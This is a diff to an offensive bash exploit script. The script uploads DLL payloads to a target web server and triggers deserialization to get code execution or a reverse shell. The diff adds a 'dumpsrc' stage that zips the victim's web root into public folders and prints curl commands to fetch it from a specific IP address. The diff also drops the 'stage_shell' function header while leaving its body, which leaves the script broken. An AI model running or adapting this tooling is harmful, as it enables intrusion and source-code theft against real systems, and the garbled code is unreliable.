@@ -40,9 +40,9 @@ banner() { # $1 = text
 # ---------------------------------------------------------------- args
 ARG="${1:-auto}"
 case "$ARG" in
-  auto|check|versions|exploit|shell|all) STAGE="$ARG" ;;
+  auto|check|versions|exploit|shell|all|dumpsrc) STAGE="$ARG" ;;
   http://*|https://*) TARGET_URL="$ARG"; STAGE="${STAGE:-all}" ;;
-  *) die "usage: $0 [auto|check|versions|exploit|shell|all|http(s)://HOST:PORT]" ;;
+  *) die "usage: $0 [auto|check|versions|exploit|shell|dumpsrc|all|http(s)://HOST:PORT]" ;;
 esac
 
 BASE_URL=""
@@ -82,9 +82,11 @@ pick_payload() { # $1 base (sleep|revshell) -> echo newest matching dll for $ARC
 }
 SLEEP_DLL="$(pick_payload sleep)"
 REV_DLL="$(pick_payload revshell)"
+DUMP_DLL="$(pick_payload dump-src)"
 [ -n "$SLEEP_DLL" ] || die "No sleep payload in $PAYLOAD_DIR (run on Windows / let CI build, or ARCH=x86)"
 info "sleep payload:   $SLEEP_DLL"
 [ -n "$REV_DLL" ] && info "revshell payload: $REV_DLL"
+[ -n "$DUMP_DLL" ] && info "dump-src payload: $DUMP_DLL"
 
 # ---------------------------------------------------------------- target discovery
 host_ip() { # $1 interface name
@@ -274,7 +276,47 @@ stage_exploit() {
   return 1
 }
 
-stage_shell() {
+# generic upload+trigger with a chosen payload
+fire_payload() { # $1 dll path  -> fires upload + deserialize once, prints result
+  local dll="$1" folder="${2:-C:\Windows\Temp}"
+  local remote
+  remote=$(upload_payload "$dll" "$VERSION" "$folder")
+  [ -n "$remote" ] || { warn "no filename reported for $(basename "$dll") in $folder"; return 1; }
+  info "remote file: $remote"
+  trigger_and_time "$remote"
+  return 0
+}
+
+stage_dumpsrc() {
+  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
+  [ -n "$DUMP_DLL" ] || die "No dump-src payload in $PAYLOAD_DIR."
+  banner "DUMP SOURCE"
+  info "Will zip the web root and drop src.zip into publicly served folders."
+  info "After it finishes, try downloading:"
+  info "  http://<host>:82/src.zip"
+  info "  http://<host>:82/StartUp/src.zip"
+  info ""
+  local a arches rt done=0
+  if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi
+  for a in "${arches[@]}"; do
+    local dll; dll=$(ARCH="$a" pick_payload dump-src)
+    [ -n "$dll" ] || { warn "no $a dump-src payload"; continue; }
+    log "FIRE: $(basename "$dll") (arch $a)"
+    rt=$(fire_payload "$dll" "C:\Windows\Temp")
+    done=1
+    break
+  done
+  if [ "$done" -ne 1 ]; then die "could not fire the dump payload"; fi
+  info ""
+  info "Waiting 20s for the zipping to finish on the target..."
+  sleep 20
+  info "Now try downloading (try both):"
+  info "  curl -O http://125.18.164.11:82/src.zip"
+  info "  curl -O http://125.18.164.11:82/StartUp/src.zip"
+  banner "DUMP FIRED"
+}
+
+
   [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
   [ -n "$REV_DLL" ] || die "No revshell payload in $PAYLOAD_DIR."
   if [ -z "$REV_HOST" ]; then
@@ -320,4 +362,5 @@ case "$STAGE" in
   versions) stage_check; stage_versions ;;
   exploit|all) stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_exploit ;;
   shell)    stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_shell ;;
+  dumpsrc)  stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_dumpsrc ;;
 esac
